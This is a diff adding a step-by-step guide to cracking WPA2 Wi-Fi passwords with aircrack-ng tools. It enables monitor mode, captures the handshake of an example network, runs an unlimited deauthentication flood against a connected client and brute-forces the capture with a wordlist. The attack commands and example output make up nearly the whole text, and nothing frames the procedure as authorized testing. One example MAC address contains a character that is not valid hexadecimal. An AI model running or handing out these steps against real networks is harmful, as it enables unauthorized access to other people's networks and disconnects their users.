@@ -1,0 +1,68 @@
+STEP 1:-
+
+//to enable monitor mode
+
+==>>   airmon-ng start wlan0    ///wlan0->wireless interface name
+
+STEP 2:-
+
+==>>   iwconfig                 //check whether the wireless interface is in monitor mode or not.
+
+STEP 3:-
+
+==>>   airodump-ng wlan0        ** this is channel hopping process
+
+STEP 4:-
+
+**//now select a acess point and stations also known as clints
+
+
+
+==>>   airodump-ng -c"specify channel"  -w "handshake capture file" -d "data that have to capture from bssid"
+
+{
+
+
+*for example :-BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID 
+              
+              64:A4:I7:81:EE:90  -67       13      202   26  5  270   WPA2 CCMP   PSK  Krishnaveni205  
+
+
+              airodump-ng -c5 -w capture -d 64:A4:I7:81:EE:90 wlan0
+              
+ }
+ 
+ STEP 5:-
+ 
+ ///For deauthentication use this command below
+ 
+ ==>>    aireplay-ng  --deauth "number packets have to send" -a "bssid" -c"clint bssid" wlan0->wireless interface
+ 
+ *example:-  BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                      
+                                                                                                        
+            F4:8C:EB:BD:65:14  0A:2B:9C:88:8D:46   -1    1e- 0      0       28 
+            
+            aireplay-ng --deauth 0  -a  F4:8C:EB:BD:65:14   -c 0A:2B:9C:88:8D:46  wlan0   ///0->for unlimited packets
+
+STEP 6:-
+        
+       ON TOP U CAN SEE HAND SHAKE CAPTURE TILL U SEE THE CAPTURE DONT QUIT THE PROCESS
+       
+       now type "ls" to see capture file "capture-01.cap"
+       
+       //too see capture handshake in wireshark type bellow command//
+       
+       ==>>   wireshark capture-01.cap
+       
+ STEP 7:-
+        //TO DO BRUTE FORCE ATTACK  WE SHOULD STOP MONITOR MODE FOR THAT USE BELOW COMMAND//
+        
+        ==>>   airmon-ng stop wlan0
+        
+        //for buteforce attack use below command//
+        
+        ==>>   aircrack-ng "handshake captured file" -w "your word list"
+        
+        *example:-
+        
+        aircrack-ng capture-01.cap -w /usr/share/wordlist/rockyou.txt
